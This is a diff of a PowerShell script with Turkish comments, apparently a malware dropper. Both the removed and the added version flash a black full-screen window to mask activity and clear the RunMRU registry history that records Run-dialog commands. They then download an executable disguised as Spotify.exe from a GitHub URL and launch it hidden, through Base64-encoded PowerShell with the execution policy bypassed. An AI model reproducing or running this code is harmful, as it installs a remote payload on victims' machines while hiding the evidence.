@@ -1,33 +1,44 @@
-$code = @'
-# 1 saniyelik siyah ekran
-$null=Add-Type -A System.Windows.Forms,System.Drawing
-$f=[Windows.Forms.Form]::new();$f.FormBorderStyle=0;$f.WindowState=2;$f.BackColor=[Drawing.Color]::Black;$f.TopMost=1;$f.ShowInTaskbar=0;$f.add_Shown({sleep 1;$f.Close()});[Windows.Forms.Application]::Run($f)
-
-# Ana kod
-$registryPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-if(Test-Path $registryPath){
-    $values=Get-ItemProperty -Path $registryPath
-    $keys=$values.PSObject.Properties|Where-Object{$_.Name-ne"PSPath"-and$_.Name-ne"PSParentPath"-and$_.Name-ne"PSChildName"-and$_.Name-ne"PSDrive"-and$_.Name-ne"PSProvider"-and$_.Name-ne"MRUList"}
-    foreach($key in $keys){
-        Remove-ItemProperty -Path $registryPath -Name $key.Name -ErrorAction SilentlyContinue
-    }
-    Set-ItemProperty -Path $registryPath -Name "MRUList" -Value ""
-    $downloadPath="C:\Users\kurtarma123\AppData\Roaming\Microsoft\Spotify.exe"
-    $url="https://github.com/t2jszt4n6p-ops/sexcan/raw/refs/heads/main/Spotify.exe"
-    $ProgressPreference="SilentlyContinue"
-    $null=Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing
-    Start-Process $downloadPath -WindowStyle Hidden
+# Önce siyah ekran için ayrı bir PowerShell başlat
+$blackScreenCode = {
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    $f = New-Object System.Windows.Forms.Form
+    $f.FormBorderStyle = 'None'
+    $f.WindowState = 'Maximized'
+    $f.BackColor = [System.Drawing.Color]::Black
+    $f.TopMost = $true
+    $f.ShowInTaskbar = $false
+    
+    $f.Add_Shown({
+        Start-Sleep -Seconds 1
+        $f.Close()
+    })
+    
+    [System.Windows.Forms.Application]::Run($f)
 }
-'@
 
-$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
-$vbsCode = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded", 0, True
-"@
+$blackEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($blackScreenCode))
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $blackEncoded" -WindowStyle Hidden
 
-$vbsPath = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.vbs'
-$vbsCode | Out-File -FilePath $vbsPath -Encoding ASCII
-Start-Process wscript.exe -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden
-Start-Sleep -Seconds 2
-Remove-Item $vbsPath -Force
+# 1 saniye bekle
+Start-Sleep -Seconds 1
+
+# Sonra ana kodu çalıştır
+$mainCode = {
+    $registryPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+    if(Test-Path $registryPath){
+        $values=Get-ItemProperty -Path $registryPath
+        $keys=$values.PSObject.Properties|Where-Object{$_.Name-ne"PSPath"-and$_.Name-ne"PSParentPath"-and$_.Name-ne"PSChildName"-and$_.Name-ne"PSDrive"-and$_.Name-ne"PSProvider"-and$_.Name-ne"MRUList"}
+        foreach($key in $keys){
+            Remove-ItemProperty -Path $registryPath -Name $key.Name -ErrorAction SilentlyContinue
+        }
+        Set-ItemProperty -Path $registryPath -Name "MRUList" -Value ""
+        $downloadPath="C:\Users\kurtarma123\AppData\Roaming\Microsoft\Spotify.exe"
+        $url="https://github.com/t2jszt4n6p-ops/sexcan/raw/refs/heads/main/Spotify.exe"
+        $ProgressPreference="SilentlyContinue"
+        $null=Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing
+        Start-Process $downloadPath -WindowStyle Hidden
+    }
+}
+
+$mainEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($mainCode))
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $mainEncoded" -WindowStyle Hidden
